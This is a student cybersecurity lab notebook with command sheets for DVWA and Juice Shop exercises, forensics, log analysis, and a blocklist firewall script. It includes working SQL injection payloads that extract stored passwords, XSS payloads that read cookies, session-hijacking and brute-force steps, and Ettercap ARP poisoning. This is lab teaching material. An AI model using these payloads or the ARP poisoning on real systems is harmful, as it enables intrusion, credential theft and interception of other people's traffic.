DVWA: docker run -it -p 8080:80 vulnerables/web-dvwa
JS:docker run -d -p 8090:3000 --name juiceshop bkimminich/juice-shop


---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
FIREWALL
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
firewall.py
import requests
import csv
import subprocess

# Feodo Tracker IP Blocklist URL
url = "https://feodotracker.abuse.ch/downloads/ipblocklist.csv"

# Download CSV file
response = requests.get(url)

# Delete old firewall rules named "BadIP"
subprocess.run(
[
"powershell",
"-Command",
"netsh advfirewall firewall delete rule name='BadIP'"
]
)

# Read CSV while ignoring comment lines starting with '#'
mycsv = csv.reader(
filter(
lambda x: not x.startswith("#"),
response.text.splitlines()
)
)

# Process each row
for row in mycsv:

# Extract destination IP column
ip = row[1].strip()

# Skip header row
if ip != "dst_ip":

# Outbound block rule
rule_out = (
f"netsh advfirewall firewall add rule "
f"name='BadIP' "
f"dir=out "
f"action=block "
f"remoteip={ip}"
)

# Inbound block rule
rule_in = (
f"netsh advfirewall firewall add rule "
f"name='BadIP' "
f"dir=in "
f"action=block "
f"remoteip={ip}"
)

# Execute firewall rules
subprocess.run(["powershell", "-Command", rule_out])
subprocess.run(["powershell", "-Command", rule_in])

print(f"[+] Blocked IP: {ip}")

print("\nAll malicious IPs have been blocked.")

Install Required Package
pip install requests

Run the Script
Run Command Prompt or PowerShell as Administrator:

python firewall.py

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
PASSWORD STRENGTH CHECK
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
import java.util.Scanner;

public class PasswordStrengthChecker {

public static String checkPasswordStrength(String password) {

int strength = 0;

// Length check
if (password.length() >= 8) {
strength++;
}

// Uppercase check
if (password.matches(".*[A-Z].*")) {
strength++;
}

// Lowercase check
if (password.matches(".*[a-z].*")) {
strength++;
}

// Number check
if (password.matches(".*[0-9].*")) {
strength++;
}

// Special character check
if (password.matches(".*[!@#$%^&*(),.?\":{}|<>].*")) {
strength++;
}

// Strength evaluation
if (strength == 5) {
return "Very Strong Password";
}
else if (strength == 4) {
return "Strong Password";
}
else if (strength == 3) {
return "Medium Password";
}
else if (strength == 2) {
return "Weak Password";
}
else {
return "Very Weak Password";
}
}

public static void main(String[] args) {

Scanner sc = new Scanner(System.in);

System.out.print("Enter Password: ");
String password = sc.nextLine();

String result = checkPasswordStrength(password);

System.out.println("Password Strength: " + result);

sc.close();
}
}
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
PACKET SNIFFING AND NETWORK TRAFFIC ANALYSIS
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# Open terminal and start HTTP server
python3 -m http.server 8080

# Open another terminal and start packet capture
sudo tcpdump -i any -w capture.pcap port 8080

# Open browser and access
http://localhost:8080

# Stop capturing using
Ctrl + C

# Open capture file in Wireshark
wireshark capture.pcap

# Apply filter in Wireshark
http.request.method == "GET"

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
SQL Injection Attack
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# Install DVWA
sudo apt update
sudo apt install dvwa -y

# Start services
sudo service apache2 start
sudo service mysql start

# Open DVWA
http://127.0.0.1/dvwa

# Normal Input
1

# Authentication Bypass
1' OR '1'='1

# Find Columns
1' ORDER BY 1-- -
1' ORDER BY 2-- -
1' ORDER BY 3-- -

# UNION Injection
1' UNION SELECT 1,2-- -

# Database Name
1' UNION SELECT database(),2-- -

# Table Names
1' UNION SELECT table_name,2
FROM information_schema.tables
WHERE table_schema=database()-- -

# Column Names
1' UNION SELECT column_name,2
FROM information_schema.columns
WHERE table_name='users'-- -

# Extract Usernames and Passwords
1' UNION SELECT user,password FROM users-- -

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Finding & Exploiting XSS Vulnerabilities using DVWA on Kali Linux
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# Start Apache
sudo service apache2 start

# Start MySQL
sudo service mysql start

http://localhost/dvwa

<!-- Reflected XSS -->
<script>alert('XSS')</script>

<!-- Stored XSS -->
<h1>Hacked</h1>

<script>alert('Stored XSS')</script>

<!-- DOM XSS -->
#<script>alert('DOM XSS')</script>

<!-- Cookie Demo -->
<script>alert(document.cookie)</script>

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Testing Authentication Weaknesses and Session Management Using Kali Linux & DVWA
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
#Step 1:
Start services.

sudo service apache2 start
sudo service mysql start

#Step 2:
Open:
http://127.0.0.1/dvwa

Login:
Username: admin
Password: password

#Step 3:
Set DVWA Security Level = LOW.

#Step 4:
Open:
DVWA → Vulnerabilities → Brute Force

Try:
admin / admin
admin / 123456
admin / password

#Step 5:
Check Cookies:
Inspect → Storage → Cookies

#Step 6:
Copy PHPSESSID.
Open Private Window (Ctrl + Shift + P).
Paste same PHPSESSID and refresh page.

#Step 7:
Check PHPSESSID before and after login.

#Step 8:
Logout from DVWA.
Reuse old PHPSESSID in Private Window.

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Ettercap
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Check IP Address
ifconfig

IP Address:
192.168.0.103

# Open Ettercap
ettercap -G

# Scan for Hosts
Hosts → Scan for Hosts

# Open Hosts List
Hosts → Hosts List

# Add Devices
Add to Target 1
Add to Target 2

# View Current Targets
Targets → Current Targets

# Start ARP Poisoning
MITM → ARP Poisoning

# Enable
Sniff Remote Connections

# Start Attack
Click OK

# Observation
ARP poisoning attack starts between victims.

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
TESTING IoT DEVICE SECURITY (DEFAULT PASSWORDS & OPEN PORTS)
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

A. DEPLOY VULNERABLE IoT SIMULATION (DOCKER)

docker run -d -p 8090:3000 --name juiceshop bkimminich/juice-shop
docker ps
docker logs juiceshop


B. ACCESS APPLICATION (VERIFY DEPLOYMENT)

http://localhost:8090


C. IDENTIFY HOST IP ADDRESS

Windows:
ipconfig

Linux/macOS:
ifconfig


D. NETWORK SCANNING FROM KALI LINUX

nmap 10.39.169.126
nmap -sV 10.39.169.126
nmap -A 10.39.169.126


E. PORT + SERVICE ENUMERATION

nmap -p- 10.39.169.126
nmap -sC -sV 10.39.169.126
nmap --open 10.39.169.126


F. ACCESS IoT DASHBOARD FROM ATTACKER MACHINE

http://10.39.169.126:8090


G. TEST DEFAULT / WEAK CREDENTIALS

admin / admin
admin / password
user / user


H. ANALYZE NETWORK TRAFFIC

Open Browser
Press F12
Go to Network Tab
Reload page
Inspect HTTP requests

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
ANALYSING ANDROID APP PERMISSIONS AND MOBILE TRAFFIC
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

A.VERIFY
1.C:\Users\Admin>cd C:\Users\Admin\AppData\Local\Android\Sdk\emulator
2.C:\Users\Admin\AppData\Local\Android\Sdk\emulator>emulator -list-avds

B.SETUP PROXY
1.cd C:\Users\Admin\AppData\Local\Android\Sdk\platform-tools
2.adb devices
3.adb shell settings put global http_proxy 10.0.2.2:8080
4.adb shell settings get global http_proxy

C.SEND CERTIFICATE TO EMULATOR
1.C:\Users\Admin\AppData\Local\Android\Sdk\platform-tools>adb push C:\Users\Admin\Downloads\burpcer.der /sdcard/Download/


E. INSTALL CERTIFICATE IN EMULATOR

Settings → Security → Install Certificate → Select burpcer.der


F. ANALYZE APP TRAFFIC

Open Android application
Observe requests in Burp Suite


G. CHECK APP PERMISSIONS

Settings → Apps → App Permissions


---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
WEB APPLICATION VULNERABILITY SCANNING WITH OWASP ZAP
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

STEP 1 — Install OWASP ZAP
Download and install OWASP ZAP from:
https://www.zaproxy.org/download/

STEP 2 — Run OWASP Juice Shop
Open Command Prompt:

docker run -d -p 3000:3000 bkimminich/juice-shop

STEP 3 — Open Juice Shop
Open browser:

http://localhost:3000

STEP 4 — Start OWASP ZAP
1. Open OWASP ZAP
2. Select:
No, I do not want to persist this session
3. Click Start

STEP 5 — Configure Proxy
Set browser proxy:

HTTP Proxy : 127.0.0.1
Port : 8080

STEP 6 — Perform Spider Scan
1. Right-click:
http://localhost:3000
2. Select:
Attack → Spider
3. Start Scan

STEP 7 — Perform Active Scan
1. Right-click:
http://localhost:3000
2. Select:
Attack → Active Scan
3. Start Scan

STEP 8 — Analyze Alerts
Open Alerts tab to view vulnerabilities like:
• XSS
• Missing Security Headers
• Cookie Issues

STEP 9 — Generate Report
Go to:
Report → Generate Report
Save report in HTML/PDF format.


---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
CREATING AND ANALYZING DISK IMAGES USING dc3dd AND AUTOPSY
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
A. OPEN TERMINAL
1.Ctrl + Alt + T

B. CREATE SAMPLE EVIDENCE
1.echo "Cybersecurity Lab Evidence" > evidence.txt
2.ls

C. IDENTIFY DISK PARTITION
1.lsblk

D. CREATE PRACTICE DISK IMAGE
1.dd if=/dev/zero of=practice_disk.dd bs=1M count=100

E. FORMAT / MOUNT DISK
1.mkfs.ext4 practice_disk.dd

F. CREATE FORENSIC IMAGE USING dc3dd
1.sudo dc3dd if=practice_disk.dd of=forensic_image.dd hash=md5 log=acquisition.log

G. VERIFY IMAGE AND LOG
1.ls -lh practice_disk.dd
2.cat acquisition.log

H. START AUTOPSY TOOL
1.autopsy

I. ACCESS AUTOPSY IN BROWSER
1.http://localhost:9999/autopsy

J. (INSIDE AUTOPSY - GUI STEPS, NOT COMMANDS)
1.Create New Case
2.Add Host
3.Add Image → Select:
4./home/kali/forensic_image.dd

K. OPTIONAL (USEFUL ADDITIONAL COMMANDS FOR ANALYSIS)
1.pwd
2.whoami
3.df -h
4.file forensic_image.dd
5.md5sum forensic_image.dd


---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Cross-Site Scripting (XSS) using Juice Shop and Burp Suite
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
STEP 1 — Run OWASP Juice Shop

Pull Docker Image:
docker pull bkimminich/juice-shop

Run Container:
docker run -d -p 3000:3000 bkimminich/juice-shop

Open:
http://localhost:3000

STEP 2 — Configure Burp Suite Proxy

1. Open Burp Suite
2. Go to:
Proxy → Options
3. Set Proxy Listener:
127.0.0.1 : 8081

Configure browser proxy:
HTTP Proxy : 127.0.0.1
Port : 8081

STEP 3 — Identify XSS Vulnerability

1. Open Juice Shop
2. Find input fields like:
• Search bar
• Login form
• Feedback form

3. In Burp Suite:
Proxy → HTTP History

4. Send request to Repeater

5. Test payload:
<script>alert("XSS")</script>

6. Click Send and observe response.

STEP 4 — Exploit XSS in Feedback Form

1. Open Feedback/Contact Us page
2. Enter payload:
<script>alert("XSS")</script>

3. Submit form

4. Alert popup confirms XSS vulnerability.

STEP 5 — Perform Stored XSS

Payload:
<script>document.write('<img src=x onerror=alert("Stored XSS")>')</script>

1. Enter payload in review/feedback field
2. Submit form
3. Reload page
4. Stored alert popup appears

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Testing Authentication Weaknesses and Session Management using Dockerized OWASP Juice Shop on Kali Linux
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

STEP 1 — Install Docker

sudo apt update
sudo apt install docker.io -y
sudo systemctl start docker
sudo systemctl enable docker

Check version:
docker --version

STEP 2 — Run OWASP Juice Shop

sudo docker run -d -p 3000:3000 --name juice-shop bkimminich/juice-shop

Check container:
sudo docker ps

STEP 3 — Open Application

http://localhost:3000

STEP 4 — Configure Burp Suite

1. Open Burp Suite
2. Proxy → Intercept ON
3. Configure browser proxy:

IP : 127.0.0.1
Port : 8080

PART A — AUTHENTICATION TESTING

Test 1: SQL Injection Login Bypass

Email:
' OR 1=1 --

Password:
anything

Result:
Login bypass successful

Inference:
Application vulnerable to SQL Injection

Test 2: Weak Password Policy

Password used:
12345

Inference:
No strong password enforcement

Test 3: Username Enumeration

1. Try valid email + wrong password
2. Try invalid email + wrong password

Result:
Different error messages displayed

Inference:
Valid usernames can be identified

PART B — SESSION MANAGEMENT TESTING

Test 4: Session Cookie Analysis

1. Login
2. Open:
F12 → Application → Cookies

Result:
Session token visible

Inference:
Check Secure and HTTPOnly flags

Test 5: Session Hijacking

1. Copy session cookie
2. Open another browser
3. Replace cookie

Result:
Access gained without login

Inference:
Session hijacking possible

Test 6: Session Fixation

1. Note session ID before login
2. Login
3. Compare session ID

Result:
Same session ID remains

Inference:
Session fixation vulnerability exists

Test 7: Logout Mechanism

1. Login and copy cookie
2. Logout
3. Reuse cookie

Result:
Session still active

Inference:
Session not invalidated properly

Test 8: JWT Token Analysis

1. Copy JWT token
2. Decode using jwt.io

Result:
Payload visible

Inference:
Improper token validation possible

DOCKER COMMANDS USED

docker ps
docker stop juice-shop
docker start juice-shop
docker rm juice-shop
docker logs juice-shop


---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
NETWORK FORENSICS USING WIRESHARK
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

A. START WIRESHARK
wireshark


B. SELECT NETWORK INTERFACE
eth0
wlan0


C. START CAPTURE
Click Start


D. GENERATE NETWORK TRAFFIC
Open browser
Visit websites
Ping systems


E. APPLY FILTERS
http
https
dns
tcp
udp
ip.addr == 192.168.1.1


F. STOP CAPTURE
Click Stop


G. ANALYZE PACKETS

Inspect:
Source IP
Destination IP
Protocols
DNS Queries
HTTP Requests




---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
LOG FILE ANALYSIS FOR INCIDENT DETECTION LAB
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
A. NAVIGATE TO LOG DIRECTORY
cd /var/log
ls

B. VIEW SUCCESSFUL LOGIN RECORDS
last

C. VIEW SYSTEM LOGS (FULL)
journalctl
journalctl | less

D. FILTER FAILED LOGIN ATTEMPTS
journalctl | grep "Failed"
journalctl | grep "Failed password"

E. VIEW SSH LOGIN ACTIVITY
journalctl | grep ssh

F. FILTER SYSTEM ERRORS
journalctl | grep -i error

G. ANALYZE APACHE LOGS
cd /var/log/apache2
ls
sudo less access.log

H. DETECT SUSPICIOUS WEB REQUESTS
grep "404" /var/log/apache2/access.log

I. VIEW PACKAGE ACTIVITY
less /var/log/dpkg.log

J. REAL-TIME LOG MONITORING
sudo journalctl -f

K. SIMULATE FAILED SSH LOGIN ATTACK
Install SSH Server
sudo apt install openssh-server -y

Start SSH Service
2. sudo service ssh start

Find IP Address
3. ip a

Generate Failed Logins
4. ssh fakeuser@localhost
5. ssh kali@localhost

L. ANALYZE FAILED LOGIN ATTEMPTS
journalctl | grep "Failed password"

M. EXTRACT SUSPICIOUS IP ADDRESS
journalctl | grep "Failed password" | awk '{print $11}'

N. COUNT FAILED ATTEMPTS PER IP
journalctl | grep "Failed password" | awk '{print $11}' | sort | uniq -c | sort -nr

O. ALTERNATIVE METHOD (FAILED LOGINS)
sudo lastb

P. CHECK RECENT LOG ACTIVITY
journalctl --since "10 minutes ago"


---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
7. PRIVACY AUDIT OF POPULAR APPS (DESKTOP WHATSAPP) AND WEBSITES (FACEBOOK) & DATA BREACH CASE STUDY ANALYSIS
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

A. INSTALL NODE.js & npm

sudo apt update

sudo apt install nodejs npm -y


B. INSTALL NATIVEFIER

sudo npm install -g nativefier


C. CREATE WHATSAPP DESKTOP APP

nativefier https://web.whatsapp.com

ls


D. RUN WHATSAPP DESKTOP

cd WhatsAppWeb-linux-x64

./WhatsAppWeb


E. LOGIN TO WHATSAPP

Open mobile WhatsApp
Linked Devices
Scan QR code


F. ANALYZE TRACKERS (EXODUS PRIVACY)

https://reports.exodus-privacy.eu.org


G. START WIRESHARK CAPTURE

wireshark


H. GENERATE NETWORK TRAFFIC

Send messages
Send images
Open chats


I. APPLY WIRESHARK FILTERS

tls

dns


J. STOP WIRESHARK CAPTURE

Click Stop


K. OPEN FACEBOOK WEBSITE

https://www.facebook.com


L. START BURP SUITE

burpsuite


M. CONFIGURE PROXY

IP: 127.0.0.1
Port: 8080


N. ENABLE INTERCEPTION

Turn Intercept ON
Reload Facebook page


O. ANALYZE TRAFFIC

Press F12
Open Network tab


P. CHECK EMAIL DATA BREACH

https://haveibeenpwned.com
